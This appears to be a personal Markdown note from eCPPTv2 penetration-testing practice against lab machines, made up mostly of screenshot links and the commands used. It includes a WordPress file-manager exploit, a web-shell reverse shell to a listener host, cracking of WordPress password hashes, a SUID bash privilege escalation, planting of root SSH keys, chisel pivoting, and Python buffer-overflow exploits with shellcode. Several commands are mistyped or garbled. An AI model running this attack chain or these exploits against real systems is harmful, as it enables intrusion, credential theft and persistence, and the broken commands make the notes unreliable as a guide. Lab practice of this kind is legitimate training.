```java
neofetch
```
![[Pasted image 20230913162208.png]]
```java
sudo arp-scan -I eth0 --localnet
```
![[Pasted image 20230913163101.png]]
```java
ping -c 192.168.153.153
```
![[Pasted image 20230913162723.png]]
```java
mkdir eCPPTv2 && cd eCPPTv2 &&mkdir 192.168.153.153 && cd 192.168.153.153 cd 192.168.153.153 mkdir {scan,content,exploit} && ls && cd scan
```
![[Pasted image 20230913162944.png]]
```java
sudo nmap -p- --opne -sS --min-rate 5000 -vvv -n -Pn 192.168.153.153 -oG allports 
```
![[Pasted image 20230913163031.png]]
```java
sudo nmap -sCV -p22,80 192.168.153.153 -oN targeted
```
![[Pasted image 20230913163307.png]]
```java
http://192.168.153.153
```
![[Pasted image 20230913164416.png]]
```java
whatweb 192.168.153.153
```
![[Pasted image 20230913164442.png]]
```java
gobuster dir -u http://192.168.153.153/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x http,php,txt
```
![[Pasted image 20230913165515.png]]
```java
http://192.168.153.153/blog/
```
![[Pasted image 20230913165540.png]]
![[Pasted image 20230913165954.png]]
```java
nano /ect/hosts
```
![[Pasted image 20230913170623.png]]
![[Pasted image 20230913170943.png]]
```java
wget http://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
```
![[Pasted image 20230914123050.png]]
```java
nano 2020-wp-file-manager-v67.py
```
![[Pasted image 20230914123235.png]]
```java
python3 2020.wp-file-manager-v67.py http://192.168.153.153/blog/
```
![[Pasted image 20230914123739.png]]
```java
192.168.153.153/blog/wp-content/plugings/wp-file-manager/lib/files/payloads.php?cmd=ip a
```
![[Pasted image 20230914133029.png]]
```java
192.168.153.153/blog/wp-content/plugings/wp-file-manager/lib/files/payloads.php?cmd=bash -c "bash -i > %26 /dev/tcp/192.168.153.152/443 0>%261"
```
![[Pasted image 20230914133342.png]]
```java
nc -nlvp 443
```
![[Pasted image 20230914133403.png]]
```java
script /dev/null -c bash
```
![[Pasted image 20230914133501.png]]
```java
stty raw -echo; fg
```
![[Pasted image 20230914133547.png]]
```java
ls 
shred -zun 10 -v payloads.php
```
![[Pasted image 20230914134236.png]]
```java
ls
cd hagrid98
cat horcrux1.txt
```
![[Pasted image 20230914134356.png]]
```java
echo base64 -d; echo
```
![[Pasted image 20230914134836.png]]
```java
cat /etc/wordpress/config-default.php
```
![[Pasted image 20230914135240.png]]
```java
mysql -uroot -p

mySecr3tPass
```
![[Pasted image 20230914135431.png]]
```java
show databases;
```
![[Pasted image 20230914135844.png]]
```java
describe wp-users;
```
![[Pasted image 20230914135946.png]]
```java
select * from wp_users;
```
![[Pasted image 20230914140102.png]]
```java
john -w:/usr/share/wordlist/rockyou.txt hash
```
![[Pasted image 20230914141452.png]]
```java
ssh hagrid98@192.168.153.153
```
![[Pasted image 20230914141629.png]]
```java
find \-user hagrid98 2>/dev/null
```
![[Pasted image 20230914142351.png]]
![[Pasted image 20230914142323.png]]
```java
ls 
ls -la
cat .backup.sh
```
![[Pasted image 20230914142432.png]]
```java
chmod u+s /bin/bash
```
![[Pasted image 20230914142705.png]]
```java
ls -la .backup.sh /bin/bash 
```
![[Pasted image 20230914142916.png]]
```java
bash -p
whoami
cd /root/
ls
cat horcrux2.txt
```
![[Pasted image 20230914143110.png]]
```java
echo base64 -d; echo
```
![[Pasted image 20230914143207.png]]
```java
cd /root/
ls -la
cd .ssh/
```
![[Pasted image 20231024105734.png]]
```java
ssh-keygen
```
![[Pasted image 20231024105800.png]]
```java
cat ~/.ssh/id_ras.pub tr -d '\n'
nano authorized_keys
```
![[Pasted image 20231024112428.png]]
```java
cat authorized_keys 
ssh root@192.168.153.153
```
![[Pasted image 20231024112910.png]]
```java
#!/bin/bash
for i in $(seq 1 254); do 
 timeout 1 bash -c "ping -c 1 10.10.0.$i &/dev/null && echo "[+] HOST 10.10.0.$i - ACTIVE
 done
 wait
```
![[Pasted image 20231024114904.png]]
```java
nano hostdiscovery.sh
chmod +x hostdiscovery.sh -vvv
./hostdiscovery.sh
```
![[Pasted image 20231024114818.png]]
![[Pasted image 20231024115515.png]]
```java
mv /home/kali/Donwloads/chisel_1.9.1_linux_amd64.gz .
gunzip chisel_1.9.1_linux_amd64.gz
```
![[Pasted image 20231024120403.png]]
```java
chmod +x chisel
```
![[Pasted image 20231024120439.png]]
```java
python3 -m http.server 80
wget http://192.168.153.152/chisel
```
![[Pasted image 20231024120707.png]]
```java
./chisel client 192.168.153.152:1234 R:socks
./chisel server --reverse -p 1234
```

![[Pasted image 20231024123805.png]]
```java
nano /etc/proxychains4.conf
socks5 127.0.0.1 1080
```
![[Pasted image 20231024124235.png]]!
```java
proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 10.10.0.128 2>/dev/null
```
![[Pasted image 20231024124623.png]]

![[Pasted image 20231024125132.png]]![[Pasted image 20231024125232.png]]
```java
gobuster dir -u http://10.10.0.128/ -w /usr/share/seclist/Discovery/Web_COntent/directory-list-2.3-medium.txt -t 20 -x http,php,txt --proxy socks5://127.0.0.1:1080
```
![[Pasted image 20231024125621.png]]
![[Pasted image 20231024130037.png]]
i will bd using our new HTTP3 server at html://quic.naguini.hogwarts for further comunications
all debelopers are request to visit the server regulary for checking lastest announcements
![[Pasted image 20231024130103.png]]
![[Pasted image 20231024132419.png]]
```java
git clone --recursive https://github.com/cloudflare/quiche
```
![[Pasted image 20231024132900.png]]
```java

```
![[Pasted image 20231024133702.png]]
![[Pasted image 20231024161121.png]]
![[Pasted image 20231024161404.png]]
![[Pasted image 20231025134810.png]]
![[Pasted image 20231025163503.png]]
![[Pasted image 20231025164844.png]]
![[Pasted image 20231025165150.png]]
![[Pasted image 20231025165223.png]]
![[Pasted image 20231101121725.png]]

![[Pasted image 20231101122003.png]]
![[Pasted image 20231109173316.png]]
![[Pasted image 20231109174738.png]]
![[Pasted image 20231109174754.png]]
![[Pasted image 20231110102820.png]]
![[Pasted image 20231110103338.png]]
![[Pasted image 20231110131016.png]]

![[Pasted image 20231110131042.png]]

![[Pasted image 20231114103219.png]]

![[Pasted image 20231114103511.png]]

![[Pasted image 20231114103701.png]]
![[Pasted image 20231114103723.png]]

![[Pasted image 20231114103916.png]]

![[Pasted image 20231114103858.png]]

![[Pasted image 20231114104102.png]]

![[Pasted image 20231114104121.png]]

![[Pasted image 20231114104949.png]]
![[Pasted image 20231114105029.png]]
![[Pasted image 20231114105207.png]]
![[Pasted image 20231114110657.png]]
![[Pasted image 20231114114610.png]]

![[Pasted image 20231114114634.png]]

![[Pasted image 20231114122045.png]]

![[Pasted image 20231114130903.png]]
![[Pasted image 20231114132324.png]]
![[Pasted image 20231114132602.png]]
![[Pasted image 20231114132845.png]]
![[Pasted image 20231114133251.png]]
![[Pasted image 20231114133642.png]]![[Pasted image 20231114134205.png]]

![[Pasted image 20231114140051.png]]
![[Pasted image 20231114140102.png]]
![[Pasted image 20231114140113.png]]
![[Pasted image 20231114140846.png]]
![[Pasted image 20231114141628.png]]
![[Pasted image 20231114142951.png]]
![[Pasted image 20231114143157.png]]
![[Pasted image 20231123114209.png]]![[Pasted image 20231123114311.png]]
![[Pasted image 20231123114703.png]]
![[Pasted image 20231123114728.png]]
![[Pasted image 20231123114936.png]]
![[Pasted image 20231123115118.png]]
![[Pasted image 20231123115532.png]]
![[Pasted image 20231123124540.png]]
![[Pasted image 20231123124920.png]]
![[Pasted image 20231123124942.png]]
![[Pasted image 20231123125120.png]]
![[Pasted image 20231123125331.png]]
![[Pasted image 20231123131403.png]]
![[Pasted image 20231123131816.png]]
![[Pasted image 20231123134836.png]]


import socket

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08"  # 8049d55 -> jmp ESP

shellcode = b""
shellcode += b"\xbf\xf5\xf9\x13\x86\xda\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x12\x83\xea\xfc\x31\x7a\x0e"
shellcode += b"\x03\x8f\xf7\xf1\x73\x5e\xd3\x01\x98\xf3\xa0"
shellcode += b"\xbe\x35\xf1\xaf\xa0\x7a\x93\x62\xa2\xe8\x02"
shellcode += b"\xcd\x9c\xc3\x34\x64\x9a\x22\x5c\xb7\xf4\x4c"
shellcode += b"\x04\x5f\x07\x6f\x35\x1b\x8e\x8e\x85\x3d\xc1"
shellcode += b"\x01\xb6\x72\xe2\x28\xd9\xb8\x65\x78\x71\x2d"
shellcode += b"\x49\x0e\xe9\xd9\xba\xdf\x8b\x70\x4c\xfc\x19"
shellcode += b"\xd0\xc7\xe2\x2d\xdd\x1a\x64"

after_eip = b"\x90" * 32 + shellcode  # ESP

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.153.156", 9898))
s.send(payload)

 Agregar un bucle infinito para mantener la conexión abierta
while True:
    data = s.recv(1024)
    if not data:
        break
    print(data.decode("utf-8"))

s.close()


![[Pasted image 20231123142700.png]]
![[Pasted image 20231123150302.png]]
![[Pasted image 20231123153652.png]]
![[Pasted image 20231123153830.png]]
![[Pasted image 20231123154053.png]]

![[Pasted image 20231123154247.png]]
![[Pasted image 20231123154348.png]]
![[Pasted image 20231127102822.png]]
![[Pasted image 20231127103333.png]]
![[Pasted image 20231127103526.png]]
![[Pasted image 20231127104711.png]]
![[Pasted image 20231127125211.png]]
![[Pasted image 20231127125225.png]]
![[Pasted image 20231127135620.png]]

![[Pasted image 20231127135558.png]]

![[Pasted image 20231127135729.png]]
![[Pasted image 20231127135921.png]]

You can enter into matrix as guest, with password k1ll0rXX

Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.

![[Pasted image 20231127140526.png]]
![[Pasted image 20231127141803.png]]
![[Pasted image 20231127142007.png]]
![[Pasted image 20231127142333.png]]

![[Pasted image 20231127142836.png]]
![[Pasted image 20231129125855.png]]![[Pasted image 20231129125940.png]]
![[Pasted image 20231129130108.png]]
![[Pasted image 20231129130311.png]]![[Pasted image 20231130094313.png]]
![[Pasted image 20231130104055.png]]
![[Pasted image 20231130105844.png]]
![[Pasted image 20231130105429.png]]![[Pasted image 20231130133629.png]]
![[Pasted image 20231130133912.png]]
![[Pasted image 20231130134037.png]]
![[Pasted image 20231130134245.png]]
![[Pasted image 20231130134824.png]]
![[Pasted image 20231130140907.png]]
![[Pasted image 20231130141134.png]]
![[Pasted image 20231130141532.png]]
![[Pasted image 20231130141547.png]]
![[Pasted image 20231130141934.png]]
![[Pasted image 20231130142148.png]]
![[Pasted image 20231130142204.png]]
![[Pasted image 20231130142420.png]]
![[Pasted image 20231130142646.png]]
![[Pasted image 20231130142656.png]]
![[Pasted image 20231130143030.png]]
![[Pasted image 20231130162711.png]]
![[Pasted image 20231130163148.png]]
![[Pasted image 20231130164805.png]]
![[Pasted image 20231130164933.png]]
![[Pasted image 20231130164955.png]]
![[Pasted image 20231130165022.png]]
![[Pasted image 20231130165112.png]]
![[Pasted image 20231130165254.png]]

```java
#!/usr/bin/python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = b"B"*4
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.153.159",9999))
s.send(payload)
s.close()
```
![[Pasted image 20231204140012.png]]![[Pasted image 20231204140024.png]]
![[Pasted image 20231204142903.png]]
![[Pasted image 20231204143109.png]]

![[Pasted image 20231204143817.png]]
![[Pasted image 20231204143835.png]]
![[Pasted image 20231204162540.png]]
![[Pasted image 20231204162726.png]]
![[Pasted image 20231204164549.png]]
![[Pasted image 20231204165713.png]]
![[Pasted image 20231204170258.png]]![[Pasted image 20231204170355.png]]

![[Pasted image 20231204170657.png]]
![[Pasted image 20231204170816.png]]
